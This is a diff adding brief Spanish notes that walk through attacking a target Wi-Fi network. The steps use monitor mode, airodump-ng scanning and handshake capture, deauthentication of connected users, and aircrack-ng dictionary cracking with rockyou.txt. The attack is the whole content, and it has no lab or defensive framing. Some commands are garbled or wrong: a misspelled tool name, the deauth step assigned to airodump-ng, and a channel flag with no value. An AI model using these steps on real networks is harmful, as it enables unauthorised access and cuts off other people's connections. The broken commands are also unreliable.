@@ -1,0 +1,26 @@
+* Es necesaria una antena que soporte el modo monitor 
+Interfaz: wlan0
+Targetat de red recomentada:
+
+[ comandos - emular AccessPoint ]
+
+{ iwconfig } - reconocer que tarjetas están
+
+{ sudo airmon-ng check kill } - romper o apagar cualquier proceso relacionado a la tarjeta de red
+
+{ sudo airmon-ng start wlan0 } - conectarse a la tarjeta de red
+
+{ sudo aidodump-ng wlan0 } - buscando las BSSID de la red objetivo
+
+{ sudo airodump-ng wlan0 -d (BSSID) } - monitorear la red objetivo
+
+Nota: se encuetra un hancheck para hacer una comparativa de las contraseñas
+
+{ sudo airodump-ng -w crack01 -c --bssid (BSSID) wlan0 } - 
+
+{ sudo airodump-ng -deauth 0 -a (BSSID) } - desconectar usuarios de la red
+
+{ sudo airmon-ng stop wlan0 } - detener 
+
+{ sudo aircrack-ng (archivoCrack) /usr/share/wordlists/rockyou.txt } - revisar en un diccionario y encontrar una contraseña
+
